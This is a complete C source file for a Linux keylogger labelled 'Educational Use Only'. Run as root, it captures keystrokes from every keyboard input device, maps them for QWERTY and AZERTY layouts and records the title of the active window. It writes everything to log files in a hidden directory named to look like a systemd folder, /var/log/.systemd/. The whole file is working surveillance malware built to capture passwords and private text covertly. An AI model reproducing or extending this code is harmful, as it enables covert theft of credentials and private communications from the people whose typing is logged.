#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <libgen.h>
#include <sys/select.h>
#include <dirent.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>

// Keyboard layout types
typedef enum {
    LAYOUT_UNKNOWN = 0,
    LAYOUT_US_QWERTY,
    LAYOUT_FR_AZERTY,
    LAYOUT_DE_QWERTZ
} keyboard_layout_t;

// Structure to hold keyboard device information
typedef struct {
    int fd;
    char path[32];
    char name[256];
    int shift_pressed;
    int ctrl_pressed;
    int alt_pressed;
    keyboard_layout_t layout;
} keyboard_device_t;

// Global variables for window tracking
Display* xdisplay = NULL;
Window current_window = 0;
char current_window_title[1024] = "Unknown";
time_t last_window_check = 0;

// Key code to character mapping for US QWERTY
const char* key_code_to_char_qwerty(int code, int shift) {
    switch(code) {
        case KEY_A: return shift ? "A" : "a";
        case KEY_B: return shift ? "B" : "b";
        case KEY_C: return shift ? "C" : "c";
        case KEY_D: return shift ? "D" : "d";
        case KEY_E: return shift ? "E" : "e";
        case KEY_F: return shift ? "F" : "f";
        case KEY_G: return shift ? "G" : "g";
        case KEY_H: return shift ? "H" : "h";
        case KEY_I: return shift ? "I" : "i";
        case KEY_J: return shift ? "J" : "j";
        case KEY_K: return shift ? "K" : "k";
        case KEY_L: return shift ? "L" : "l";
        case KEY_M: return shift ? "M" : "m";
        case KEY_N: return shift ? "N" : "n";
        case KEY_O: return shift ? "O" : "o";
        case KEY_P: return shift ? "P" : "p";
        case KEY_Q: return shift ? "Q" : "q";
        case KEY_R: return shift ? "R" : "r";
        case KEY_S: return shift ? "S" : "s";
        case KEY_T: return shift ? "T" : "t";
        case KEY_U: return shift ? "U" : "u";
        case KEY_V: return shift ? "V" : "v";
        case KEY_W: return shift ? "W" : "w";
        case KEY_X: return shift ? "X" : "x";
        case KEY_Y: return shift ? "Y" : "y";
        case KEY_Z: return shift ? "Z" : "z";
        case KEY_0: return shift ? ")" : "0";
        case KEY_1: return shift ? "!" : "1";
        case KEY_2: return shift ? "@" : "2";
        case KEY_3: return shift ? "#" : "3";
        case KEY_4: return shift ? "$" : "4";
        case KEY_5: return shift ? "%" : "5";
        case KEY_6: return shift ? "^" : "6";
        case KEY_7: return shift ? "&" : "7";
        case KEY_8: return shift ? "*" : "8";
        case KEY_9: return shift ? "(" : "9";
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n";
        case KEY_TAB: return "[TAB]";
        case KEY_BACKSPACE: return "[BS]";
        case KEY_DOT: return shift ? ">" : ".";
        case KEY_COMMA: return shift ? "<" : ",";
        case KEY_SLASH: return shift ? "?" : "/";
        case KEY_SEMICOLON: return shift ? ":" : ";";
        case KEY_APOSTROPHE: return shift ? "\"" : "'";
        case KEY_LEFTBRACE: return shift ? "{" : "[";
        case KEY_RIGHTBRACE: return shift ? "}" : "]";
        case KEY_BACKSLASH: return shift ? "|" : "\\";
        case KEY_MINUS: return shift ? "_" : "-";
        case KEY_EQUAL: return shift ? "+" : "=";
        case KEY_GRAVE: return shift ? "~" : "`";
        default: return NULL;
    }
}

// Key code to character mapping for French AZERTY
const char* key_code_to_char_azerty(int code, int shift) {
    switch(code) {
        case KEY_A: return shift ? "A" : "a";
        case KEY_B: return shift ? "B" : "b";
        case KEY_C: return shift ? "C" : "c";
        case KEY_D: return shift ? "D" : "d";
        case KEY_E: return shift ? "E" : "e";
        case KEY_F: return shift ? "F" : "f";
        case KEY_G: return shift ? "G" : "g";
        case KEY_H: return shift ? "H" : "h";
        case KEY_I: return shift ? "I" : "i";
        case KEY_J: return shift ? "J" : "j";
        case KEY_K: return shift ? "K" : "k";
        case KEY_L: return shift ? "L" : "l";
        case KEY_M: return shift ? "M" : "m";
        // Q and A are swapped in AZERTY
        case KEY_Q: return shift ? "A" : "a";
        case KEY_W: return shift ? "Z" : "z";
        case KEY_X: return shift ? "X" : "x";
        case KEY_Y: return shift ? "Y" : "y";
        // Z and W are swapped in AZERTY
        case KEY_Z: return shift ? "W" : "w";
        case KEY_R: return shift ? "R" : "r";
        case KEY_S: return shift ? "S" : "s";
        case KEY_T: return shift ? "T" : "t";
        case KEY_U: return shift ? "U" : "u";
        case KEY_V: return shift ? "V" : "v";
        case KEY_N: return shift ? "N" : "n";
        case KEY_O: return shift ? "O" : "o";
        case KEY_P: return shift ? "P" : "p";
        
        // Number row with AZERTY symbols
        case KEY_0: return shift ? "@" : "à";
        case KEY_1: return shift ? "|" : "&";
        case KEY_2: return shift ? "#" : "é";
        case KEY_3: return shift ? "{" : "\"";
        case KEY_4: return shift ? "[" : "'";
        case KEY_5: return shift ? "|" : "(";
        case KEY_6: return shift ? "`" : "-";
        case KEY_7: return shift ? "\\" : "è";
        case KEY_8: return shift ? "^" : "_";
        case KEY_9: return shift ? "]" : "ç";
        
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n";
        case KEY_TAB: return "[TAB]";
        case KEY_BACKSPACE: return "[BS]";
        
        // Special characters in AZERTY
        case KEY_DOT: return shift ? "/" : ".";
        case KEY_COMMA: return shift ? "?" : ",";
        case KEY_SLASH: return shift ? "§" : "!";
        case KEY_SEMICOLON: return shift ? "." : "m";
        case KEY_APOSTROPHE: return shift ? "%" : "ù";
        case KEY_LEFTBRACE: return shift ? "°" : ")";
        case KEY_RIGHTBRACE: return shift ? "+" : "=";
        case KEY_BACKSLASH: return shift ? "£" : "*";
        case KEY_MINUS: return shift ? "]" : ")";
        case KEY_EQUAL: return shift ? "}" : "-";
        case KEY_GRAVE: return shift ? "" : "@";
        
        default: return NULL;
    }
}

// Get system keyboard layout without X11
keyboard_layout_t get_system_keyboard_layout() {
    // Method 1: Check environment variables
    char* lang_env = getenv("LANG");
    if (lang_env) {
        if (strstr(lang_env, "fr_FR") || strstr(lang_env, "fr_BE") || strstr(lang_env, "fr_CA")) {
            return LAYOUT_FR_AZERTY;
        }
        if (strstr(lang_env, "de_DE") || strstr(lang_env, "de_CH") || strstr(lang_env, "de_AT")) {
            return LAYOUT_DE_QWERTZ;
        }
    }
    
    // Method 2: Check /etc/default/keyboard
    FILE* fp = fopen("/etc/default/keyboard", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "XKBLAYOUT=")) {
                if (strstr(line, "fr")) {
                    fclose(fp);
                    return LAYOUT_FR_AZERTY;
                } else if (strstr(line, "de")) {
                    fclose(fp);
                    return LAYOUT_DE_QWERTZ;
                }
            }
        }
        fclose(fp);
    }
    
    // Method 3: Check /etc/vconsole.conf (for virtual console)
    fp = fopen("/etc/vconsole.conf", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "KEYMAP=")) {
                if (strstr(line, "fr")) {
                    fclose(fp);
                    return LAYOUT_FR_AZERTY;
                } else if (strstr(line, "de")) {
                    fclose(fp);
                    return LAYOUT_DE_QWERTZ;
                }
            }
        }
        fclose(fp);
    }
    
    // Method 4: Use localectl (systemd)
    fp = popen("localectl status 2>/dev/null | grep Layout", "r");
    if (fp) {
        char buffer[256];
        if (fgets(buffer, sizeof(buffer), fp)) {
            if (strstr(buffer, "fr")) {
                pclose(fp);
                return LAYOUT_FR_AZERTY;
            } else if (strstr(buffer, "de")) {
                pclose(fp);
                return LAYOUT_DE_QWERTZ;
            }
        }
        pclose(fp);
    }
    
    return LAYOUT_US_QWERTY; // Default fallback
}

// Function to detect keyboard layout based on multiple methods
keyboard_layout_t detect_keyboard_layout(const char* device_name) {
    // Method 1: Check device name for clues (low priority)
    if (strstr(device_name, "azerty") != NULL || 
        strstr(device_name, "AZERTY") != NULL) {
        return LAYOUT_FR_AZERTY;
    }
    
    if (strstr(device_name, "qwertz") != NULL || 
        strstr(device_name, "QWERTZ") != NULL) {
        return LAYOUT_DE_QWERTZ;
    }
    
    // Method 2: Use system-wide layout (most reliable)
    return get_system_keyboard_layout();
}

// Get character based on keyboard layout
const char* key_code_to_char_layout(int code, int shift, keyboard_layout_t layout) {
    switch(layout) {
        case LAYOUT_FR_AZERTY:
            return key_code_to_char_azerty(code, shift);
        case LAYOUT_DE_QWERTZ:
            // For now, use QWERTY for QWERTZ (you can implement QWERTZ mapping similarly)
            return key_code_to_char_qwerty(code, shift);
        case LAYOUT_US_QWERTY:
        default:
            return key_code_to_char_qwerty(code, shift);
    }
}

// Get layout name as string
const char* layout_to_string(keyboard_layout_t layout) {
    switch(layout) {
        case LAYOUT_US_QWERTY: return "US QWERTY";
        case LAYOUT_FR_AZERTY: return "FR AZERTY";
        case LAYOUT_DE_QWERTZ: return "DE QWERTZ";
        default: return "UNKNOWN";
    }
}

char* get_executable_dir() {
    static char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        char* dir = dirname(path);
        strncpy(path, dir, sizeof(path));
        return path;
    }
    
    if (getcwd(path, sizeof(path)) != NULL) {
        return path;
    }
    
    return ".";
}

char* get_logfile_path() {
    static char path[1024];
    snprintf(path, sizeof(path), "/var/log/.systemd/keylog.txt");
    return path;
}

char* get_details_logfile_path() {
    static char path[1024];
    snprintf(path, sizeof(path), "/var/log/.systemd/details_keylog.txt");
    return path;
}

void write_to_log(const char* text) {
    FILE* log_file = fopen(get_logfile_path(), "a");
    if (log_file) {
        fprintf(log_file, "%s", text);
        fflush(log_file);
        fclose(log_file);
    }
}

void write_to_details_log(const char* text) {
    FILE* details_log_file = fopen(get_details_logfile_path(), "a");
    if (details_log_file) {
        fprintf(details_log_file, "%s", text);
        fflush(details_log_file);
        fclose(details_log_file);
    }
}

// Initialize X11 display for window tracking
int init_x11_display() {
    xdisplay = XOpenDisplay(NULL);
    if (!xdisplay) {
        printf("X11 display not available - window tracking disabled\n");
        write_to_details_log("X11 display not available - window tracking disabled\n");
        return 0;
    }
    return 1;
}

// Get current active window title
void update_active_window() {
    if (!xdisplay) return;
    
    time_t now = time(NULL);
    // Only check window every 2 seconds to avoid excessive CPU usage
    if (now - last_window_check < 2) {
        return;
    }
    last_window_check = now;
    
    Window focused;
    int revert_to;
    XGetInputFocus(xdisplay, &focused, &revert_to);
    
    if (focused != current_window) {
        current_window = focused;
        
        // Get window title
        XTextProperty text_prop;
        if (XGetWMName(xdisplay, focused, &text_prop) && text_prop.value && text_prop.nitems > 0) {
            char** list = NULL;
            int count = 0;
            if (XmbTextPropertyToTextList(xdisplay, &text_prop, &list, &count) == Success && count > 0 && list) {
                strncpy(current_window_title, list[0], sizeof(current_window_title) - 1);
                current_window_title[sizeof(current_window_title) - 1] = '\0';
                XFreeStringList(list);
            } else {
                strcpy(current_window_title, "Unknown");
            }
            XFree(text_prop.value);
        } else {
            strcpy(current_window_title, "Unknown");
        }
        
        // Log window change
        char window_log[2048];
        snprintf(window_log, sizeof(window_log), "[WINDOW CHANGE] Active window: %s\n", current_window_title);
        write_to_details_log(window_log);
        printf("%s", window_log);
    }
}

// Close X11 display
void close_x11_display() {
    if (xdisplay) {
        XCloseDisplay(xdisplay);
        xdisplay = NULL;
    }
}

// Find all keyboard devices
int find_all_keyboard_devices(keyboard_device_t* devices, int max_devices) {
    int device_count = 0;
    
    printf("Searching for keyboard devices...\n");
    write_to_details_log("Searching for keyboard devices...\n");
    
    // First, get the system layout to use as default
    keyboard_layout_t system_layout = get_system_keyboard_layout();
    printf("Detected system keyboard layout: %s\n", layout_to_string(system_layout));
    
    char layout_msg[256];
    snprintf(layout_msg, sizeof(layout_msg), "Detected system keyboard layout: %s\n", layout_to_string(system_layout));
    write_to_details_log(layout_msg);
    
    for (int i = 0; i < 32 && device_count < max_devices; i++) {
        char device_path[32];
        snprintf(device_path, sizeof(device_path), "/dev/input/event%d", i);
        
        if (access(device_path, F_OK) != 0) {
            continue;
        }
        
        int fd = open(device_path, O_RDONLY | O_NONBLOCK);
        if (fd == -1) {
            continue;
        }
        
        // Get device name
        char device_name[256] = "Unknown";
        if (ioctl(fd, EVIOCGNAME(sizeof(device_name)), device_name) < 0) {
            strcpy(device_name, "Unknown");
        }
        
        unsigned long evbit = 0;
        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) == -1) {
            close(fd);
            continue;
        }
        
        // Check if device supports key events
        if (evbit & (1 << EV_KEY)) {
            unsigned char keybit[KEY_MAX/8 + 1];
            memset(keybit, 0, sizeof(keybit));
            
            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) == -1) {
                close(fd);
                continue;
            }
            
            // Check if it has typical keyboard keys
            if (keybit[KEY_A/8] & (1 << (KEY_A % 8)) || 
                keybit[KEY_SPACE/8] & (1 << (KEY_SPACE % 8))) {
                
                strncpy(devices[device_count].path, device_path, sizeof(devices[device_count].path));
                strncpy(devices[device_count].name, device_name, sizeof(devices[device_count].name));
                devices[device_count].fd = fd;
                devices[device_count].shift_pressed = 0;
                devices[device_count].ctrl_pressed = 0;
                devices[device_count].alt_pressed = 0;
                
                // Detect keyboard layout - use system layout as default
                keyboard_layout_t detected = detect_keyboard_layout(device_name);
                devices[device_count].layout = (detected != LAYOUT_UNKNOWN) ? detected : system_layout;
                
                char device_msg[512];
                snprintf(device_msg, sizeof(device_msg), "Found keyboard: %s (fd: %d, name: %s, layout: %s)\n", 
                       device_path, fd, device_name, layout_to_string(devices[device_count].layout));
                printf("%s", device_msg);
                write_to_details_log(device_msg);
                device_count++;
            } else {
                close(fd);
            }
        } else {
            close(fd);
        }
    }
    
    return device_count;
}

// Process event from a specific keyboard device
void process_keyboard_event(keyboard_device_t* device) {
    struct input_event ev;
    
    while (1) {
        ssize_t bytes_read = read(device->fd, &ev, sizeof(ev));
        if (bytes_read != sizeof(ev)) {
            break; // No more events to read
        }
        
        if (ev.type == EV_KEY) {
            // Update modifier keys state
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                device->shift_pressed = (ev.value == 1 || ev.value == 2);
            }
            else if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) {
                device->ctrl_pressed = (ev.value == 1 || ev.value == 2);
            }
            else if (ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT) {
                device->alt_pressed = (ev.value == 1 || ev.value == 2);
            }
            // Log key presses only
            else if (ev.value == 1) {
                const char* ch = key_code_to_char_layout(ev.code, device->shift_pressed, device->layout);
                
                char log_entry[256];
                char details_entry[512];
                
                if (ch) {
                    if (device->ctrl_pressed && device->alt_pressed) {
                        snprintf(log_entry, sizeof(log_entry), "[CTRL+ALT+%s]", ch);
                    } else if (device->ctrl_pressed) {
                        snprintf(log_entry, sizeof(log_entry), "[CTRL+%s]", ch);
                    } else if (device->alt_pressed) {
                        snprintf(log_entry, sizeof(log_entry), "[ALT+%s]", ch);
                    } else {
                        snprintf(log_entry, sizeof(log_entry), "%s", ch);
                    }
                    
                    write_to_log(log_entry);
                    
                    // Create detailed log entry with window information
                    update_active_window();
                    snprintf(details_entry, sizeof(details_entry), 
                            "[Window: %s] Device %s (%s): %s (code: %d, layout: %s)\n", 
                            current_window_title, device->path, device->name, log_entry, 
                            ev.code, layout_to_string(device->layout));
                    
                    printf("%s", details_entry);
                    write_to_details_log(details_entry);
                } else {
                    snprintf(log_entry, sizeof(log_entry), "[KEY_%d]", ev.code);
                    write_to_log(log_entry);
                    
                    // Create detailed log entry with window information
                    update_active_window();
                    snprintf(details_entry, sizeof(details_entry), 
                            "[Window: %s] Device %s (%s): Unknown key code: %d (layout: %s)\n", 
                            current_window_title, device->path, device->name, 
                            ev.code, layout_to_string(device->layout));
                    
                    printf("%s", details_entry);
                    write_to_details_log(details_entry);
                }
            }
        }
    }
}

int main() {
    printf("=== Multi-Device Keylogger with Layout Detection ===\n");
    printf("Educational Use Only - Layout Detection Enabled\n\n");
    
    // Check if running as root
    if (geteuid() != 0) {
        printf("ERROR: This program must be run as root!\n");
        printf("Use: sudo ./keylogger\n");
        return 1;
    }
    
    // Initialize X11 for window tracking
    int x11_available = init_x11_display();
    
    keyboard_device_t devices[32];
    int device_count = find_all_keyboard_devices(devices, 32);
    
    if (device_count == 0) {
        printf("No keyboard devices found!\n");
        write_to_details_log("No keyboard devices found!\n");
        close_x11_display();
        return 1;
    }
    
    printf("\nFound %d keyboard device(s)\n", device_count);
    printf("Main log file: %s (appends keystrokes)\n", get_logfile_path());
    printf("Details log file: %s (appends detailed information)\n", get_details_logfile_path());
    printf("Press Ctrl+C to stop...\n\n");
    
    // Write header to details log file (append mode)
    time_t now = time(NULL);
    FILE* details_log_file = fopen(get_details_logfile_path(), "a");
    if (details_log_file) {
        fprintf(details_log_file, "\n\n=== Multi-Device Keylogger with Layout Detection ===\n");
        fprintf(details_log_file, "New session started at: %s", ctime(&now));
        fprintf(details_log_file, "Monitoring %d keyboard device(s):\n", device_count);
        for (int i = 0; i < device_count; i++) {
            fprintf(details_log_file, "  - %s (%s) [Layout: %s]\n", 
                   devices[i].path, devices[i].name, layout_to_string(devices[i].layout));
        }
        if (x11_available) {
            fprintf(details_log_file, "Window tracking: ENABLED\n");
        } else {
            fprintf(details_log_file, "Window tracking: DISABLED (X11 not available)\n");
        }
        fprintf(details_log_file, "=================================\n");
        fclose(details_log_file);
    }
    
    // Write simple header to main log file (append mode)
    FILE* log_file = fopen(get_logfile_path(), "a");
    if (log_file) {
        fprintf(log_file, "\n\n=== Session started at: %s", ctime(&now));
        fclose(log_file);
    }
    
    printf("Ready to capture keystrokes from all devices...\n");
    printf("Layout detection active - keys will be mapped correctly for each keyboard layout.\n");
    if (x11_available) {
        printf("Window tracking active - active window will be logged.\n");
    }
    printf("\n");
    
    // Main monitoring loop using select()
    while (1) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        
        int max_fd = -1;
        
        // Add all keyboard file descriptors to the set
        for (int i = 0; i < device_count; i++) {
            FD_SET(devices[i].fd, &read_fds);
            if (devices[i].fd > max_fd) {
                max_fd = devices[i].fd;
            }
        }
        
        // Wait for activity on any keyboard with 1 second timeout
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int result = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (result == -1) {
            if (errno == EINTR) {
                // Interrupted by signal, likely Ctrl+C
                break;
            }
            printf("Select error: %s\n", strerror(errno));
            write_to_details_log("Select error occurred\n");
            continue;
        }
        
        if (result == 0) {
            // Timeout occurred, no activity - update window periodically
            if (x11_available) {
                update_active_window();
            }
            continue;
        }
        
        // Process events from devices that have data
        for (int i = 0; i < device_count; i++) {
            if (FD_ISSET(devices[i].fd, &read_fds)) {
                process_keyboard_event(&devices[i]);
            }
        }
    }
    
    // Cleanup - close all file descriptors
    printf("\nClosing all devices...\n");
    write_to_details_log("\nClosing all devices...\n");
    for (int i = 0; i < device_count; i++) {
        close(devices[i].fd);
    }
    
    // Write footer to log files
    time_t end_time = time(NULL);
    
    details_log_file = fopen(get_details_logfile_path(), "a");
    if (details_log_file) {
        fprintf(details_log_file, "=================================\n");
        fprintf(details_log_file, "Keylogger stopped at: %s", ctime(&end_time));
        fclose(details_log_file);
    }
    
    log_file = fopen(get_logfile_path(), "a");
    if (log_file) {
        fprintf(log_file, "=== Session stopped at: %s", ctime(&end_time));
        fclose(log_file);
    }
    
    // Close X11 display
    close_x11_display();
    
    printf("Keylogger stopped.\n");
    printf("Main keystrokes: %s\n", get_logfile_path());
    printf("Detailed log: %s\n", get_details_logfile_path());
    
    return 0;
}
